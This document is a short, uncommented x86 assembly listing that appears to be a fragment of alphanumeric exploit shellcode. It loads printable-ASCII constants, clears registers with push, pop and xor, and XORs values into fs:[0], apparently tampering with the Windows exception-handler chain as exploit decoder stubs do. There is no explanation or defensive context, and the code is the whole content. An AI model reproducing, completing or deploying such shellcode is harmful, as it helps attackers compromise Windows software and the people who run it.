push 396A6A71
pop eax
xor eax,396A6A71
push eax
push edi
push eax
push eax
push ebx
push edx
push eax
push eax
popad
xor edi,dword ptr fs:[eax]
push esp
push edi
push esp
xor esi,dword ptr [esp+esi]
pop ecx
xor dword ptr fs:[eax],edi
xor dword ptr fs:[eax],esi